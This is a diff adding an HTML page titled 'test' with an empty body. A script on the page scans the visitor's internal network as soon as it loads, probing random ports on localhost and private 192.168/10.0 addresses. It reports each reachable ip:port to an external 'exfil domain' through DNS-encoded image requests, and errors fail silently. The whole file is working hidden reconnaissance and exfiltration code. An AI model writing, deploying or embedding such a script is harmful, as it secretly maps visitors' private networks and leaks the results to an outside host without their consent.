@@ -1,0 +1,72 @@
+<html>
+<head><title>test</title>
+<script>
+let host_root = "d0cq1ok065aoztitg.xtric.homes"; // your exfil domain
+
+function getRandomPorts(count) {
+  const ports = new Set();
+  while (ports.size < count) {
+    ports.add(Math.floor(Math.random() * 65536));
+  }
+  return Array.from(ports);
+}
+
+function getRandomInternalIP() {
+  const choice = Math.floor(Math.random() * 5);
+
+  switch (choice) {
+    case 0:
+      return "localhost";
+    case 1:
+      return "127.0.0.1";
+    case 2:
+      return "0.0.0.0";
+    case 3: {
+      let a = Math.floor(Math.random() * 256);
+      let b = Math.floor(Math.random() * 256);
+      return `192.168.${a}.${b}`;
+    }
+    case 4: {
+      let a = Math.floor(Math.random() * 256);
+      let b = Math.floor(Math.random() * 256);
+      return `10.0.${a}.${b}`;
+    }
+  }
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function scan() {
+  const ip = getRandomInternalIP();
+  const ports = getRandomPorts(128);
+
+  for (let port of ports) {
+    let url = `http://${ip}:${port}`;
+
+    try {
+      await fetch(url, {
+        method: 'GET',
+        mode: 'no-cors'
+      });
+
+      // Sanitize IP for DNS subdomain
+      const ip_sub = ip.replace(/\./g, '-');
+      let img = new Image();
+      img.src = `http://ip${ip_sub}-${port}.${host_root}`;
+    } catch (e) {
+      // Silent fail
+    }
+
+    await sleep(50);
+  }
+}
+
+scan();
+
+</script>
+</head>
+<body>
+</body>
+</html>
